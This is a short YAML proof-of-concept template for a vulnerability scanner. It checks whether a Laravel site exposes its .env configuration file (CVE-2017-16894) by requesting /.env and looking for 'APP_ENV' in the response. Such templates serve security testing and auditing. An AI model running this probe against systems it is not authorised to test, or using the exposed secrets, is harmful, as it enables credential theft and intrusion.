name: poc-yaml-cve-2017-16894-sensitive-documents
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /.env
            headers: 
              User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
            follow_redirects: false
        expression: |
            response.status == 200 && response.body.bcontains(b'APP_ENV')
expression: r0()
detail:
    author: marmot
    links: 
     - "https://1ance.xyz/peiqi/PeiQi_Wiki/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894.html"